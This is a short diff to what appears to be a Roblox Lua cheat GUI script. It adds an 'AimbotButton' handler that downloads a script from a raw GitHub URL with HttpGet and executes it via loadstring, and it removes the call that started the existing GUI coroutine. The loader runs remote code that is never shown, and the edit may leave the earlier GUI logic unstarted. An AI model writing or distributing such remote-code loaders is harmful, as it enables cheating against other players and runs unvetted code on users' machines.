@@ -114,4 +114,7 @@ local function FWGPJQK_fake_script() -- ScreenGui.LocalScript
 		script.Parent.APP.Visible = false
 	end)
 end
-coroutine.wrap(FWGPJQK_fake_script)()
+ 
+ AimbotButton.MouseButton1Up:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZOOMforn/Haskis/refs/heads/main/%23%23%23%23%23jd"))()		
+ end)
